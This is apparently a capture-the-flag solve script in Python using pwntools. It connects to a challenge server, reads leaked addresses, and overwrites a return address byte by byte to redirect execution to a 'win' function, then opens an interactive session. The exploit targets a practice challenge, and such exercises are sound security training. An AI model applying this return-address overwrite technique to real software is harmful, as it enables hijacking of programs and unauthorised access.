from pwn import *

p = remote("challs.nusgreyhats.org", 33021)

line = p.recvline_contains("Here's your address of choice")
choice_addr = int(line.split()[-1], 16)

line = p.recvline_contains("You need to call the function")
win_addr = int(line.split()[-1], 16)

ret_addr = choice_addr + 20 + 8

for i in range(8):
    p.sendlineafter("> ", "2")
    p.sendlineafter("hex:", hex(ret_addr + i))
    p.sendlineafter("to:", hex((win_addr >> (i * 8)) & 0xff))

p.sendlineafter("> ", "3")
p.interactive()
